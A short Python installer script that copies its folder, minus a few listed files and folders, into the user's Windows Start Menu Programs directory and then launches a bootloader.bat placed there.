import shutil
from pathlib import Path
import getpass
import os
import subprocess


SOURCE_DIR = Path(__file__).parent
username = getpass.getuser()
PROGRAMS_DIR = Path(rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs")
pathboot = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\bootloader.bat"
pd = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
BLACKLIST_FILES = {"TERMS.txt", "LICENCE.txt", "NEWS.txt", "remover.pyw"}
BLACKLIST_EXTS = {}
BLACKLIST_DIRS = {"OpenFile", "__pycache__"}
def safe_copy_tree(src: Path, dst: Path):
 try: 
    src = src.resolve()
    dst = dst.resolve()
    dst.mkdir(parents=True, exist_ok=True)

    for root, dirs, files in os.walk(src):
        root_path = Path(root)
        rel = root_path.relative_to(src)
        target_root = dst.joinpath(rel)


        dirs[:] = [d for d in dirs if d not in BLACKLIST_DIRS]

        target_root.mkdir(parents=True, exist_ok=True)

        for fname in files:
            if fname in BLACKLIST_FILES:
                continue
            if Path(fname).suffix.lower() in BLACKLIST_EXTS:
                continue
            shutil.copy2(root_path.joinpath(fname), target_root.joinpath(fname))

 except Exception as e:
    print(f"Error during copy: {e}")
    input("Press Enter to exit...")
if __name__ == "__main__":
    safe_copy_tree(SOURCE_DIR, PROGRAMS_DIR)
    subprocess.run(['cmd', '/c', 'start', '', pathboot], shell=False)
